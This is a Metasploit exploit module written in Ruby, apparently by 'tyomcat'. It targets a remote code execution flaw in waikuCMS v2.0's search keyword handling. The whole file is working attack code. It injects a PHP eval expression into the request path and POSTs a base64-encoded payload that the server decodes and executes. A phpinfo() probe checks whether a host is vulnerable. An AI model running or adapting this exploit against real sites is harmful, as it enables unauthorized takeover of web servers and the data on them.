#encoding:utf-8
require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  def initialize(info={})
    super(update_info(info,
        'Name'           => "waikuCMS Search Keyword RCE",
        'Description'    => %q{
          歪酷cms搜索关键字存在任意代码执行漏洞
        },
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
          'tyomcat'    
        ],
        'References'     =>
          [
          ['wooyun.org', 'http://www.wooyun.org/bugs/wooyun-2010-048523'],
        ],
        'Payload'        =>
          {
          'BadChars' => "\x00",
          'Keys'        => ['php'],
          'DisableNops' => true,
       
        },
        'DefaultOptions'  =>
          {
          'ExitFunction' => "none"
        },
        'Platform'        => [ 'php' ],
        'Arch'           => ARCH_PHP,
        'Targets'        =>[[ 'waikuCMS v2.0 Release UTF8 build 20130612', { }]],
        'Privileged'     => false,
        'DisclosureDate' => "Jan 12 2014",
        'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('RHOST', [true, 'The DOMAIN', '127.0.0.1']), 
        OptString.new('URI', [true, 'The base path to waikuCMS', '/']),
      ], self.class)
  end


  def check
    res = exec_php('phpinfo();', true)

    if res && res.body =~ /This program makes use of the Zend/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Unknown
    end
  end
  


  def exploit
    unless exec_php(payload.encoded)
      fail_with(Failure::Unknown, "#{peer} - Exploit failed, aborting.")
    end
  end
  
  
  def exec_php(php_code, is_check = false)
    payload_clean = php_code.gsub(/(\s+)|(#.*)/, '')

    while Rex::Text.encode_base64(payload_clean) =~ /=/
      payload_clean = "#{ payload_clean } "
    end
    noerrorstring='@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);'
    payload_b64 = Rex::Text.encode_base64(noerrorstring+payload_clean)
    begin
      res = send_request_cgi( {
          'method' => "POST",
          'uri'    => normalize_uri(datastore['URI'])+%q(index.php/module/action/param1/$%7B@print(eval($_REQUEST%5Bc%5D))%7D),
          'header'=> {
            'user-agent'=> 'Mozilla/5.0',
          },
          'vars_post' =>{
            'c' => '@eval($_POST[sb]($_POST[z0]));',
            'sb'=>'base64_decode',
            'z0'=>"#{payload_b64}",
          },
        }, 20)
      res_payload = res
    rescue ::Rex::ConnectionError => e
      fail_with(Failure::Unreachable, e.message)
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
      if is_check
        return res_payload
      else
        return true
      end
    end
  end
end
